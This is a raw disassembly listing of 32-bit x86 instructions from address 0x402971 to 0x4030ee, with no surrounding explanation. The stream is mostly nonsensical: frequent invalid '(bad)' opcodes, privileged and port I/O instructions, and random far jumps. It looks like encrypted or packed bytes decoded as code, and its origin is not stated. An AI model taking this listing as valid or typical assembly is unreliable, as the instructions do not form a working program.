  402971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402972:	pop    edx
  402973:	jge    0x4029b6
  402975:	mov    dl,0xb8
  402977:	push   ecx
  402978:	mov    dh,ch
  40297a:	pop    edx
  40297b:	xor    eax,0x65e7d2aa
  402980:	sbb    BYTE PTR [ecx],dh
  402982:	popf   
  402983:	mov    eax,0x65427dd
  402988:	in     eax,dx
  402989:	pop    ebx
  40298a:	in     eax,dx
  40298b:	mov    BYTE PTR [edx+0x17],dh
  40298e:	int3   
  40298f:	ss std 
  402991:	test   DWORD PTR [edx+0x2a],edi
  402994:	pop    edx
  402995:	sub    al,0xde
  402997:	outs   dx,DWORD PTR ds:[esi]
  402998:	xchg   esp,eax
  402999:	(bad)  
  40299a:	xchg   esp,eax
  40299b:	loopne 0x4029b1
  40299d:	cld    
  40299e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40299f:	(bad)  
  4029a0:	pop    ecx
  4029a1:	js     0x402976
  4029a3:	mov    ebx,ebx
  4029a5:	mul    BYTE PTR [esp+ebx*4+0x29]
  4029a9:	or     ch,BYTE PTR [edi-0x725f30bc]
  4029af:	jmp    0x4c1f:0xd66d2b6b
  4029b6:	outs   dx,DWORD PTR ds:[esi]
  4029b7:	je     0x402a11
  4029b9:	les    ecx,FWORD PTR [eax+ebx*8]
  4029bc:	inc    edx
  4029bd:	adc    al,0x54
  4029bf:	inc    ebp
  4029c0:	push   cs
  4029c1:	outs   dx,BYTE PTR ds:[esi]
  4029c2:	dec    BYTE PTR [eax]
  4029c4:	outs   dx,DWORD PTR ds:[esi]
  4029c5:	mov    edi,DWORD PTR [ebp+0x6b]
  4029c8:	fsubr  QWORD PTR [edx+ebx*4-0x2f]
  4029cc:	cmp    eax,0x67a49af4
  4029d1:	sbb    al,0xce
  4029d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d4:	cmp    BYTE PTR [esi],ah
  4029d6:	addr16 aas 
  4029d8:	es push eax
  4029da:	cld    
  4029db:	inc    ecx
  4029dc:	lods   al,BYTE PTR ds:[esi]
  4029dd:	mov    ds:0x54b63050,al
  4029e2:	cmp    BYTE PTR [eax],0xf1
  4029e5:	ds stos BYTE PTR es:[edi],al
  4029e7:	sbb    BYTE PTR [eax+edx*2],al
  4029ea:	cmp    dl,BYTE PTR [esi]
  4029ec:	inc    edx
  4029ed:	mov    al,0x31
  4029ef:	push   es
  4029f0:	ins    DWORD PTR es:[edi],dx
  4029f1:	aas    
  4029f2:	dec    edx
  4029f3:	adc    al,0x3c
  4029f5:	pop    esi
  4029f6:	cmp    dh,0x50
  4029f9:	pop    edi
  4029fa:	or     dh,dl
  4029fc:	(bad)  
  4029fd:	sbb    ebx,edx
  4029ff:	or     al,0x3d
  402a01:	add    ch,BYTE PTR [ecx]
  402a03:	fild   WORD PTR [ebx-0x11a9e6da]
  402a09:	xchg   esi,eax
  402a0a:	sub    bh,ch
  402a0c:	add    DWORD PTR [edx],ebx
  402a0e:	into   
  402a0f:	add    al,0x62
  402a11:	push   eax
  402a12:	(bad)  
  402a13:	push   ecx
  402a14:	pop    esi
  402a15:	sti    
  402a16:	adc    eax,0xcbaff850
  402a1b:	mov    esp,0xcd14f1c7
  402a20:	fcmovnb st,st(0)
  402a22:	dec    ebp
  402a23:	imul   ebp,DWORD PTR [ebx+ecx*1],0xfffffffc
  402a27:	out    dx,al
  402a28:	out    dx,al
  402a29:	add    al,ch
  402a2b:	paddusw mm3,QWORD PTR [ebx+edi*8-0x5404c299]
  402a33:	aaa    
  402a34:	call   0xe34341e7
  402a39:	out    0xa1,al
  402a3b:	xchg   ecx,eax
  402a3c:	outs   dx,DWORD PTR ds:[esi]
  402a3d:	jl     0x402a9f
  402a3f:	dec    ebp
  402a40:	inc    esi
  402a41:	mov    edi,0xf75c9ad1
  402a46:	lds    ecx,FWORD PTR [edx+0x7b]
  402a49:	mov    ebp,0x47537821
  402a4e:	jo     0x402a99
  402a50:	dec    edi
  402a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a52:	push   ds
  402a53:	mov    dl,0x49
  402a55:	mov    ah,0x48
  402a57:	pop    ebx
  402a58:	or     ch,BYTE PTR [esp+edi*1+0x51]
  402a5c:	jne    0x402a48
  402a5e:	shl    edx,1
  402a60:	pop    esi
  402a61:	dec    ebp
  402a62:	ds jo  0x402ae2
  402a65:	call   0x7786c41a
  402a6a:	imul   eax,DWORD PTR [edi+edi*1-0x323f6639],0xffffffa0
  402a72:	in     al,0x8f
  402a74:	dec    ebp
  402a75:	in     eax,0xf9
  402a77:	cmp    bh,BYTE PTR [edi+0x61]
  402a7a:	sub    edi,edx
  402a7c:	push   edi
  402a7d:	pop    ds
  402a7e:	push   esi
  402a7f:	call   0xd329fe2d
  402a84:	mov    ds:0x80b2c5d9,eax
  402a89:	shl    dh,cl
  402a8b:	adc    al,0x6d
  402a8d:	jle    0x402a60
  402a8f:	int3   
  402a90:	jg     0x402a6e
  402a92:	add    bh,BYTE PTR [edi-0x4c]
  402a95:	add    al,0x26
  402a97:	mov    fs,esi
  402a99:	frstpm(287 only) 
  402a9b:	push   0x6773e4e9
  402aa0:	fistp  WORD PTR [ecx]
  402aa2:	stos   DWORD PTR es:[edi],eax
  402aa3:	inc    DWORD PTR [ebx]
  402aa5:	mov    eax,ds:0x68b40dc1
  402aaa:	inc    edx
  402aab:	or     DWORD PTR [ecx],edx
  402aad:	iret   
  402aae:	mov    ebx,0xb82bd1e5
  402ab3:	mov    gs,WORD PTR [ecx-0x63]
  402ab6:	cmp    BYTE PTR [esi],bl
  402ab8:	hlt    
  402ab9:	xor    eax,0xe45f3a38
  402abe:	inc    edi
  402abf:	fild   DWORD PTR [esi+0x4e]
  402ac2:	cmp    eax,DWORD PTR [esi+0x53d69d9f]
  402ac8:	xchg   DWORD PTR [ecx+0x1d3e147e],eax
  402ace:	leave  
  402acf:	add    cl,cl
  402ad1:	jnp    0x402af9
  402ad3:	jns    0x402b1e
  402ad5:	clts   
  402ad7:	adc    bl,ch
  402ad9:	xchg   edx,eax
  402ada:	gs stos BYTE PTR es:[edi],al
  402adc:	push   esi
  402add:	mov    al,ss:0x6679d0ef
  402ae3:	jne    0x402aa8
  402ae5:	std    
  402ae6:	pop    esi
  402ae7:	and    DWORD PTR [esi-0x10faf3a1],edx
  402aed:	sbb    BYTE PTR [edi-0x2b6093ad],ch
  402af3:	fcomp  QWORD PTR [esi+0x3]
  402af6:	pop    ebp
  402af7:	(bad)  
  402af8:	mov    bh,0x3c
  402afa:	sbb    al,0x80
  402afc:	shl    BYTE PTR [esi-0x4a],cl
  402aff:	xrelease xchg BYTE PTR [edi],bl
  402b02:	inc    ebp
  402b03:	push   ebx
  402b04:	push   ebp
  402b05:	pop    es
  402b06:	sar    BYTE PTR [esi-0x12],cl
  402b09:	call   0xf4c54756
  402b0e:	in     al,0xc5
  402b10:	mov    dh,0xe
  402b12:	mov    bl,0x99
  402b14:	cli    
  402b15:	in     eax,dx
  402b16:	data16 out dx,al
  402b18:	mov    bl,BYTE PTR [ecx+eax*1-0x6d052043]
  402b1f:	mov    edi,0xb34be82b
  402b24:	lods   eax,DWORD PTR ds:[esi]
  402b25:	mov    al,0x56
  402b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b28:	mov    eax,ss:0xf53feff1
  402b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b2f:	jg     0x402b43
  402b31:	jecxz  0x402b46
  402b33:	test   al,0x75
  402b35:	sti    
  402b36:	mov    DWORD PTR [edi-0x10bce9a7],edx
  402b3c:	xchg   ebp,eax
  402b3d:	stc    
  402b3e:	je     0x402b13
  402b40:	in     al,0xef
  402b42:	push   edx
  402b43:	stc    
  402b44:	and    ah,bh
  402b46:	and    ebx,DWORD PTR [ecx]
  402b48:	pop    ebx
  402b49:	xor    eax,0x6fbd8ed3
  402b4e:	mov    bl,al
  402b50:	mov    gs,WORD PTR [ebx+edi*2+0xd61a3c3]
  402b57:	imul   DWORD PTR [esi+0x79]
  402b5a:	adc    al,0x24
  402b5c:	rol    BYTE PTR [ebx],cl
  402b5e:	clc    
  402b5f:	cwde   
  402b60:	ss push esi
  402b62:	fnstsw WORD PTR [ecx]
  402b64:	out    dx,al
  402b65:	and    cl,BYTE PTR [edi-0x4b4a2ac8]
  402b6b:	push   esp
  402b6c:	pop    ecx
  402b6d:	push   ebp
  402b6e:	jae    0x402b69
  402b70:	dec    eax
  402b71:	inc    esi
  402b72:	fstp   TBYTE PTR ds:0x4d2384a1
  402b78:	in     al,0x48
  402b7a:	repz in al,0x5b
  402b7d:	(bad)  
  402b7e:	sar    BYTE PTR [ebx-0x231c840a],1
  402b84:	ret    
  402b85:	sbb    al,0xae
  402b87:	pop    edi
  402b88:	mov    ?,eax
  402b8a:	sti    
  402b8b:	cld    
  402b8c:	push   edx
  402b8d:	cdq    
  402b8e:	dec    ecx
  402b8f:	int3   
  402b90:	push   0x20
  402b92:	add    eax,0xefe202fc
  402b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b98:	retf   
  402b99:	sub    ah,dl
  402b9b:	mov    edi,0xac87a6a3
  402ba0:	add    DWORD PTR [ecx-0x274e74fd],ebx
  402ba6:	retf   0x8289
  402ba9:	mov    ebp,0x41f00f95
  402bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402baf:	mov    edx,0xec34939b
  402bb4:	into   
  402bb5:	sub    cl,BYTE PTR [ebp+0x4]
  402bb8:	inc    eax
  402bb9:	call   0xa06b:0xad447cd4
  402bc0:	frstor [eax+0x2]
  402bc3:	push   ss
  402bc4:	xor    eax,0xcc47648d
  402bc9:	mov    eax,0xb9bd560c
  402bce:	fsub   st,st(6)
  402bd0:	mov    ch,0xc7
  402bd2:	jnp    0x402c06
  402bd4:	dec    esi
  402bd5:	std    
  402bd6:	out    0xd8,al
  402bd8:	adc    ebx,ebp
  402bda:	pop    es
  402bdb:	push   eax
  402bdc:	out    dx,eax
  402bdd:	pop    es
  402bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bdf:	es out dx,eax
  402be1:	cwde   
  402be2:	cs int3 
  402be4:	into   
  402be5:	retf   0x5c5f
  402be8:	sar    DWORD PTR [ebx],1
  402bea:	adc    DWORD PTR [esi+0x67],edx
  402bed:	les    esi,FWORD PTR [esi+0x1d]
  402bf0:	cmp    eax,0x901317cc
  402bf5:	jp     0x402bac
  402bf7:	mov    ds:0x896f2de2,al
  402bfc:	jecxz  0x402ba7
  402bfe:	add    BYTE PTR [ebp+0x2a],bh
  402c01:	outs   dx,BYTE PTR ds:[esi]
  402c02:	popa   
  402c03:	(bad)  
  402c04:	out    dx,eax
  402c05:	sbb    eax,0x36fdee92
  402c0a:	es stc 
  402c0c:	cs repz add eax,0xc3309998
  402c13:	mov    ebp,0xf4c44ca5
  402c18:	mov    dl,0x9e
  402c1a:	mov    ah,0x31
  402c1c:	push   ebp
  402c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c1e:	jecxz  0x402bfd
  402c20:	adc    eax,0x27bfc5a7
  402c25:	xchg   ebx,eax
  402c26:	test   al,0x9f
  402c28:	out    0x99,eax
  402c2a:	aas    
  402c2b:	aam    0x47
  402c2d:	or     eax,0xe049312c
  402c32:	sbb    ebx,DWORD PTR [edx+0xb1e8881]
  402c38:	cdq    
  402c39:	cs dec edi
  402c3b:	sti    
  402c3c:	ds sti 
  402c3e:	jne    0x402be3
  402c40:	hlt    
  402c41:	jecxz  0x402bcc
  402c43:	arpl   WORD PTR [esi],sp
  402c45:	dec    edx
  402c46:	lock xor eax,0xc46b463c
  402c4c:	inc    eax
  402c4d:	test   al,0xd5
  402c4f:	adc    BYTE PTR [esi-0x3eef9b92],dh
  402c55:	out    0xe0,eax
  402c57:	mov    ecx,DWORD PTR [edi+0x36]
  402c5a:	jecxz  0x402c69
  402c5c:	gs cmc 
  402c5e:	mov    ah,BYTE PTR [ebx]
  402c60:	jae    0x402c59
  402c62:	and    eax,0xd79e4ac7
  402c67:	push   edx
  402c68:	int3   
  402c69:	fisttp DWORD PTR [edx-0x17]
  402c6c:	push   ebx
  402c6d:	sar    BYTE PTR ds:0x6a501504,0x3c
  402c74:	fs xchg esp,eax
  402c76:	push   cs
  402c77:	loopne 0x402c7e
  402c79:	mov    esi,DWORD PTR [esi]
  402c7b:	rcr    ch,1
  402c7d:	loopne 0x402c6f
  402c7f:	jmp    0xd992:0x8ef45ff2
  402c86:	mov    BYTE PTR [edx-0x6b8a5b5e],ah
  402c8c:	sub    DWORD PTR [esi],eax
  402c8e:	sbb    edx,DWORD PTR [eax]
  402c90:	(bad)  
  402c91:	outs   dx,BYTE PTR ds:[esi]
  402c92:	(bad)  
  402c93:	loopne 0x402cd8
  402c95:	mov    esi,0xfcb9c7cd
  402c9a:	scas   eax,DWORD PTR es:[edi]
  402c9b:	jecxz  0x402cac
  402c9d:	and    eax,0xc71e7c02
  402ca2:	loope  0x402c98
  402ca4:	xor    cl,BYTE PTR [esi]
  402ca6:	rol    BYTE PTR [esi],1
  402ca8:	sbb    al,0xce
  402caa:	pop    es
  402cab:	in     al,dx
  402cac:	cmp    DWORD PTR [ebx+0x31],ecx
  402caf:	push   ds
  402cb0:	adc    ebp,DWORD PTR [eax]
  402cb2:	cmp    ebx,DWORD PTR [edi-0x7acba1cb]
  402cb8:	xchg   esp,eax
  402cb9:	xchg   ebp,eax
  402cba:	jbe    0x402c9e
  402cbc:	sub    DWORD PTR [eax+ebp*1-0x75],esp
  402cc0:	out    dx,eax
  402cc1:	sbb    BYTE PTR [ebp+0x59],bh
  402cc4:	(bad)  
  402cc5:	gs jne 0x402d45
  402cc8:	ja     0x402c50
  402cca:	mov    dl,0x7e
  402ccc:	les    ecx,FWORD PTR [edi+0x2d94145c]
  402cd2:	sub    eax,0x517d9a51
  402cd7:	rcr    dh,cl
  402cd9:	mov    gs,eax
  402cdb:	sbb    eax,0x2e5f9948
  402ce0:	sub    BYTE PTR [edi+edi*4+0x25651aa7],bl
  402ce7:	mov    ecx,0xe56b68f3
  402cec:	add    BYTE PTR [ebx+ebx*8-0x5f779f40],cl
  402cf3:	push   es
  402cf4:	xlat   BYTE PTR ds:[ebx]
  402cf5:	fcmovnb st,st(3)
  402cf7:	ins    BYTE PTR es:[edi],dx
  402cf8:	xchg   ebp,eax
  402cf9:	fidivr DWORD PTR [ebx-0x39]
  402cfc:	leave  
  402cfd:	add    DWORD PTR [ecx],esp
  402cff:	lock mov ah,0x3c
  402d02:	mov    ch,0x44
  402d04:	xlat   BYTE PTR ds:[ebx]
  402d05:	jmp    0x402cd2
  402d07:	adc    ah,BYTE PTR [esi+0x44ca1d57]
  402d0d:	(bad)  
  402d0e:	daa    
  402d0f:	ret    
  402d10:	adc    eax,0xdb64f13
  402d15:	add    BYTE PTR [ebp+0x3d],bh
  402d18:	jecxz  0x402cba
  402d1a:	mov    eax,ds:0xb7726ca3
  402d1f:	add    BYTE PTR [esi-0x1189e1bc],ah
  402d25:	mov    ebp,0xce27cad7
  402d2a:	fadd   QWORD PTR [eax-0x5a14ebdc]
  402d30:	pushf  
  402d31:	mov    edi,0x975de369
  402d36:	push   edx
  402d37:	cmp    BYTE PTR [esi],ah
  402d39:	(bad)  
  402d3a:	(bad)  
  402d3b:	jp     0x402d34
  402d3d:	add    BYTE PTR [ebx+0x58],cl
  402d40:	je     0x402ce5
  402d42:	test   BYTE PTR [esi+0x47],0x2e
  402d46:	arpl   bp,sp
  402d48:	push   edx
  402d49:	sub    al,0x9c
  402d4b:	(bad)  
  402d4c:	sbb    ebp,DWORD PTR [esi+0x29]
  402d4f:	shl    bl,0x1b
  402d52:	xchg   esi,eax
  402d53:	ret    0x2692
  402d56:	addr16 cli 
  402d58:	or     esp,eax
  402d5a:	inc    ecx
  402d5b:	sub    al,0xe1
  402d5d:	scas   eax,DWORD PTR es:[edi]
  402d5e:	cmp    DWORD PTR [edi],ebp
  402d60:	arpl   WORD PTR [ebx],si
  402d62:	cld    
  402d63:	push   edi
  402d64:	repnz fwait
  402d66:	push   0x2f
  402d68:	jmp    0x402dac
  402d6a:	cmc    
  402d6b:	int3   
  402d6c:	fdiv   QWORD PTR [edx]
  402d6e:	adc    DWORD PTR [eax-0x558ff147],edi
  402d74:	and    ebp,ecx
  402d76:	ss popf 
  402d78:	imul   eax,edi,0xffffff95
  402d7b:	sar    DWORD PTR [esi-0x91aa48b],0x18
  402d82:	jae    0x402dd6
  402d84:	xchg   edx,eax
  402d85:	mov    DWORD PTR [ebp+0x32],ebx
  402d88:	nop
  402d89:	mov    WORD PTR [edx+0x3bd97b52],fs
  402d8f:	pop    es
  402d90:	stos   DWORD PTR es:[edi],eax
  402d91:	cmp    BYTE PTR [esi+0x21231cbd],dh
  402d97:	mov    cl,0xb6
  402d99:	and    eax,0x58096325
  402d9e:	adc    BYTE PTR [edx-0x32be7b38],0x4c
  402da5:	(bad)  
  402da6:	gs adc eax,0x240d38b1
  402dac:	push   ebp
  402dad:	cld    
  402dae:	xchg   esp,eax
  402daf:	and    DWORD PTR [ecx+ebp*8],edx
  402db2:	mov    eax,0x87663d1f
  402db7:	mov    cl,0x3b
  402db9:	adc    bl,BYTE PTR [ecx]
  402dbb:	lock adc eax,0x6031f5a
  402dc1:	addps  xmm1,xmm0
  402dc4:	inc    edx
  402dc5:	mov    dh,0x1c
  402dc7:	pushf  
  402dc8:	xchg   ebp,eax
  402dc9:	das    
  402dca:	mov    esp,0x6323d6c4
  402dcf:	jo     0x402da7
  402dd1:	das    
  402dd2:	adc    al,BYTE PTR [edx-0x2a]
  402dd5:	repz inc esi
  402dd7:	out    dx,eax
  402dd8:	pusha  
  402dd9:	daa    
  402dda:	add    bl,cl
  402ddc:	into   
  402ddd:	xchg   ebp,eax
  402dde:	cmp    edx,ebp
  402de0:	fdiv   DWORD PTR [eax+0x53]
  402de3:	mov    eax,ds:0xf75ecad6
  402de8:	dec    BYTE PTR [ebx]
  402dea:	int    0xb1
  402dec:	clc    
  402ded:	pop    ss
  402dee:	int    0xb5
  402df0:	cs mov ch,0x0
  402df3:	cmp    BYTE PTR [ecx],dl
  402df5:	adc    al,0x6b
  402df7:	test   eax,0xdf375371
  402dfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dfd:	test   cl,dh
  402dff:	jp     0x402d97
  402e01:	mov    edx,0x1f1cfbcc
  402e06:	out    0x5b,eax
  402e08:	cmc    
  402e09:	mov    ch,0x40
  402e0b:	sbb    dh,BYTE PTR [eax-0x2f]
  402e0e:	xor    al,0xde
  402e10:	aam    0x88
  402e12:	fidivr WORD PTR [edx-0x50]
  402e15:	das    
  402e16:	loopne 0x402db2
  402e18:	sbb    edx,DWORD PTR [esi+edx*2]
  402e1b:	or     cl,BYTE PTR [edi-0x45]
  402e1e:	je     0x402dce
  402e20:	inc    esi
  402e21:	aas    
  402e22:	shr    al,0xc3
  402e25:	ret    
  402e26:	sbb    bl,bl
  402e28:	sahf   
  402e29:	inc    edx
  402e2a:	syscall 
  402e2c:	pop    ebp
  402e2d:	jecxz  0x402e5d
  402e2f:	outs   dx,BYTE PTR ds:[esi]
  402e30:	leave  
  402e31:	and    DWORD PTR [edi],esi
  402e33:	and    eax,0xa94173be
  402e38:	cmc    
  402e39:	pop    esp
  402e3a:	ds das 
  402e3c:	popf   
  402e3d:	dec    esi
  402e3e:	push   edi
  402e3f:	xor    BYTE PTR [ebx],cl
  402e41:	in     al,0xde
  402e43:	mov    esi,0x441a54d8
  402e48:	nop
  402e49:	je     0x402eaf
  402e4b:	shl    DWORD PTR [edx+edi*4],1
  402e4e:	jo     0x402dfb
  402e50:	pop    esi
  402e51:	not    BYTE PTR [edi+0x2e7eea10]
  402e57:	mov    esi,DWORD PTR [edi]
  402e59:	mov    bl,0xe1
  402e5b:	jno    0x402ec6
  402e5d:	jb     0x402e53
  402e5f:	imul   edx,ebp,0xe1c3bf21
  402e65:	lds    ebx,FWORD PTR [ebp-0x7c05fd58]
  402e6b:	mov    ebx,0x81cdcf23
  402e70:	pop    esp
  402e71:	mov    ebx,0x45f14d71
  402e76:	dec    ebp
  402e77:	test   DWORD PTR [ecx+eiz*2-0x6f80a48b],ebp
  402e7e:	adc    ebx,DWORD PTR [edi+edx*1]
  402e81:	lds    edx,FWORD PTR [ecx+0x5cbbf7a1]
  402e87:	popf   
  402e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e89:	adc    BYTE PTR [ebx],ah
  402e8b:	sbb    DWORD PTR [ebp+0x132fac00],0xffffffda
  402e92:	mov    edx,0x373d7e10
  402e97:	in     eax,0x33
  402e99:	fst    st(5)
  402e9b:	test   BYTE PTR [esi-0x4d734381],dh
  402ea1:	jbe    0x402e86
  402ea3:	das    
  402ea4:	and    DWORD PTR [ebx-0x5f5a1929],0xffffffec
  402eab:	mov    dl,0xf8
  402ead:	xor    BYTE PTR [esi+0x5],0xb6
  402eb1:	jb     0x402eb9
  402eb3:	push   esi
  402eb4:	jmp    0x12ffc3e2
  402eb9:	fs scas eax,DWORD PTR es:[edi]
  402ebb:	add    eax,0x6dcf07e5
  402ec0:	repz add esp,DWORD PTR [ecx-0x3d]
  402ec4:	in     al,0xac
  402ec6:	jb     0x402e7e
  402ec8:	adc    cl,BYTE PTR [ebp*2-0x7cd24677]
  402ecf:	add    al,0x52
  402ed1:	dec    edx
  402ed2:	icebp  
  402ed3:	or     BYTE PTR [edx+0x23],dl
  402ed6:	sbb    al,BYTE PTR [ecx]
  402ed8:	push   ecx
  402ed9:	out    0xba,ax
  402edc:	mov    DWORD PTR [edi-0x6b],eax
  402edf:	ss (bad) 
  402ee1:	loop   0x402f11
  402ee3:	push   0xffffff96
  402ee5:	shr    DWORD PTR [ebx+0x107e126c],1
  402eeb:	fisub  DWORD PTR [eax]
  402eed:	sbb    bh,bl
  402eef:	jg     0x402f6b
  402ef1:	jbe    0x402f50
  402ef3:	rcr    BYTE PTR [ebx-0x66a2fdb4],1
  402ef9:	aaa    
  402efa:	test   eax,0xe7b61bf9
  402eff:	test   BYTE PTR [esi-0x7b],cl
  402f02:	imul   esp,DWORD PTR ds:0xa50887c2,0xffffff90
  402f09:	pushfw 
  402f0b:	mov    ah,0x47
  402f0e:	sub    bh,dh
  402f10:	adc    esp,edi
  402f12:	mov    bh,0x61
  402f14:	sbb    eax,0xa8c52554
  402f19:	fistp  WORD PTR [edi-0x72]
  402f1c:	xchg   edi,eax
  402f1d:	in     eax,dx
  402f1e:	jmp    0xdeeb:0xf7502bca
  402f25:	fwait
  402f26:	cmp    eax,0x36324574
  402f2b:	adc    al,0x93
  402f2d:	and    edi,DWORD PTR [eax+0x153ada20]
  402f33:	mov    ah,0xab
  402f35:	adc    al,BYTE PTR [esi-0x72]
  402f38:	fs jl  0x402f54
  402f3b:	xlat   BYTE PTR ss:[bx]
  402f3e:	lea    edi,[edx+0x6f]
  402f41:	pop    ss
  402f42:	icebp  
  402f43:	cmp    al,0x6c
  402f45:	outs   dx,BYTE PTR ds:[esi]
  402f46:	popa   
  402f47:	ja     0x402ee6
  402f49:	pop    ebp
  402f4a:	inc    ebx
  402f4b:	test   al,0xfe
  402f4d:	jbe    0x402ed6
  402f4f:	shl    DWORD PTR [eax],1
  402f51:	xchg   ecx,eax
  402f52:	in     al,dx
  402f53:	xchg   esi,eax
  402f54:	sti    
  402f55:	xchg   esi,eax
  402f56:	pop    ebx
  402f57:	(bad)  
  402f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f59:	and    bh,BYTE PTR [eax]
  402f5b:	add    BYTE PTR [edx-0x77a4da2d],0x57
  402f62:	mov    ebx,0xd20b51c6
  402f67:	push   DWORD PTR [ecx-0x2e4d7e34]
  402f6d:	ror    DWORD PTR [eax+0x31fdbe04],0x4e
  402f74:	ss jecxz 0x402f4c
  402f77:	retf   0xc123
  402f7a:	fs ret 
  402f7c:	fcomp  QWORD PTR [edx]
  402f7e:	dec    ecx
  402f7f:	mov    bl,0x4c
  402f81:	sti    
  402f82:	inc    esp
  402f83:	cmp    ch,bh
  402f85:	add    DWORD PTR [eax],ebx
  402f87:	mov    edx,0xf82814ef
  402f8c:	aaa    
  402f8d:	inc    esp
  402f8e:	call   0xc48fb99a
  402f93:	xor    eax,0x26a6c74d
  402f98:	sub    DWORD PTR [eax+0x7c8cc04f],eax
  402f9e:	jge    0x402f4c
  402fa0:	dec    ebx
  402fa1:	mov    fs,WORD PTR [esi+ebx*4-0x40]
  402fa5:	rcl    DWORD PTR [edi+ebx*8-0x20],1
  402fa9:	cmp    BYTE PTR [edx],bh
  402fab:	pop    es
  402fac:	(bad)  
  402fad:	dec    DWORD PTR [ecx+0x6b]
  402fb0:	mov    bh,0x9a
  402fb2:	add    esp,ebp
  402fb4:	into   
  402fb5:	xchg   ecx,eax
  402fb6:	lds    edi,FWORD PTR [ecx+eax*2]
  402fb9:	fdivr  QWORD PTR [ebx]
  402fbb:	(bad)  
  402fbc:	push   ebp
  402fbd:	dec    ebx
  402fbe:	xchg   ecx,eax
  402fbf:	aas    
  402fc0:	jmp    0x402f9d
  402fc2:	mov    BYTE PTR ds:0x483ce731,dh
  402fc8:	sub    ecx,esi
  402fca:	leave  
  402fcb:	invd   
  402fcd:	sbb    BYTE PTR [eax+0x501501c3],bh
  402fd3:	shl    DWORD PTR ds:0xa772ce9,cl
  402fd9:	lahf   
  402fda:	cld    
  402fdb:	aas    
  402fdc:	ds jo  0x402fae
  402fdf:	jg     0x402f69
  402fe1:	inc    esp
  402fe2:	adc    al,0x6e
  402fe4:	pushf  
  402fe5:	dec    edi
  402fe6:	xor    BYTE PTR [ecx+0x1d088e25],dl
  402fec:	jg     0x402f91
  402fee:	das    
  402fef:	mov    fs,esi
  402ff1:	(bad)  
  402ff2:	jmp    0x2472:0x271cb91a
  402ff9:	add    edx,DWORD PTR [edi-0x5f]
  402ffc:	ja     0x403075
  402ffe:	stos   DWORD PTR es:[edi],eax
  402fff:	pop    eax
  403000:	lods   eax,DWORD PTR ds:[esi]
  403001:	adc    eax,0xf179c5ff
  403006:	(bad)  
  403007:	out    0x28,eax
  403009:	aas    
  40300a:	adc    eax,0x7df970f
  40300f:	shl    BYTE PTR [edx],cl
  403011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403012:	in     al,0x5
  403014:	add    eax,0xd5226561
  403019:	lea    eax,[edi]
  40301b:	fisttp DWORD PTR [edi+0xaee8a0f]
  403021:	adc    al,0xe8
  403023:	stos   BYTE PTR es:[edi],al
  403024:	mov    ah,0xcd
  403026:	dec    ebp
  403027:	dec    ebx
  403028:	dec    edi
  403029:	sub    ecx,DWORD PTR [ebp+0x1b]
  40302c:	and    ebx,eax
  40302e:	cmp    DWORD PTR [esi],edx
  403030:	bound  esp,QWORD PTR ds:0xf8286ab6
  403036:	xor    BYTE PTR [edx+edi*2],0xa5
  40303a:	pop    esi
  40303b:	icebp  
  40303c:	sub    dh,BYTE PTR [esi+0x3]
  40303f:	popa   
  403040:	repz or BYTE PTR [edx-0x68e44d37],ah
  403047:	mov    ebp,0xb51ec6cd
  40304c:	sbb    cl,dh
  40304e:	test   eax,0x6a3ad26b
  403053:	das    
  403054:	shl    DWORD PTR [ebp+0x4c],0x88
  403058:	mov    cl,0x77
  40305a:	inc    ecx
  40305b:	(bad)  
  40305d:	icebp  
  40305e:	into   
  40305f:	jno    0x4030a9
  403061:	test   BYTE PTR [eax-0x44],dh
  403064:	shr    BYTE PTR [ecx+0x3c],0x65
  403068:	xor    edx,DWORD PTR [ecx-0x400c70d4]
  40306e:	inc    edi
  40306f:	adc    ebp,edx
  403071:	leave  
  403072:	ins    DWORD PTR es:[edi],dx
  403073:	aam    0xed
  403075:	aaa    
  403076:	push   esi
  403077:	(bad)  
  403078:	add    WORD PTR [ebp+0x7cad045d],di
  40307f:	sbb    cl,BYTE PTR [ebx]
  403081:	(bad)
  403084:	adc    edx,DWORD PTR [esi+edx*1-0x24]
  403088:	push   DWORD PTR [ecx]
  40308a:	sbb    al,0x6c
  40308c:	push   ecx
  40308d:	add    al,0x7a
  40308f:	or     ch,dl
  403091:	adc    BYTE PTR [edx],ch
  403093:	mov    al,0xfd
  403095:	jmp    0x779d1326
  40309a:	sbb    al,0xba
  40309c:	fmul   QWORD PTR [ebp+0x49]
  40309f:	lock into 
  4030a1:	stc    
  4030a2:	test   DWORD PTR [edx-0x3b],ecx
  4030a5:	lock mov dl,0x89
  4030a8:	sbb    BYTE PTR [eax-0x49926676],bh
  4030ae:	add    al,0x91
  4030b0:	mov    cl,0xb6
  4030b2:	add    bl,BYTE PTR [ebp-0x61]
  4030b5:	fst    DWORD PTR [ebx]
  4030b7:	mov    ch,0xea
  4030b9:	sub    BYTE PTR [ebx+0x7363349a],bh
  4030bf:	movzx  ebx,WORD PTR fs:[eax+ebp*1-0x6]
  4030c5:	push   ebp
  4030c6:	fild   QWORD PTR [ebp+0x21]
  4030c9:	sbb    ebp,ebx
  4030cb:	push   edx
  4030cc:	dec    edx
  4030cd:	hlt    
  4030ce:	fmul   QWORD PTR [edi-0x3e7505c1]
  4030d4:	repz mov al,0xdc
  4030d7:	clc    
  4030d8:	mov    BYTE PTR ds:0xc0fd61dd,al
  4030de:	clc    
  4030df:	retf   
  4030e0:	mov    esi,0xcb191203
  4030e5:	in     eax,dx
  4030e6:	pop    es
  4030e7:	test   al,0x2b
  4030e9:	ins    DWORD PTR es:[edi],dx
  4030ea:	(bad)  
  4030eb:	ins    BYTE PTR es:[edi],dx
  4030ec:	jno    0x4030d8
  4030ee:	mov    bl,0x48
